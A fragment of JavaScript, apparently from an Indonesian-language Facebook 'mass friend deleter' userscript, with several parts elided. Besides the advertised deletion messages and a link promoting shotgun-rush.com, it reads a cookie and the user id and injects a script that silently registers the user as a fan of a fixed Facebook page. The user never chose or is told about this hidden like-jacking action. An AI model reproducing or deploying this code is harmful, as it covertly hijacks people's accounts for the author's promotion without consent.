...
function replace_msg(x) {
	$('div.dialog_body').html('Selamat! ' + x + ' anda telah berhasil menghapus teman anda. Kunjungi saya di <a target="_blank" href="http://www.shotgun-rush.com">http://www.shotgun-rush.com</a> Untuk Lebih detailnya.');
}
set_timer();
$("#mass_deleter").live("click", function() {
	...
	if (i == '0') {
		alert('Apakah anda tidak mengerti A.N.K ? Pilihlah beberapa teman Yang akan hapus terlebih dahulu.');
	}
	sleep(i);
});
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:171808392958639,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
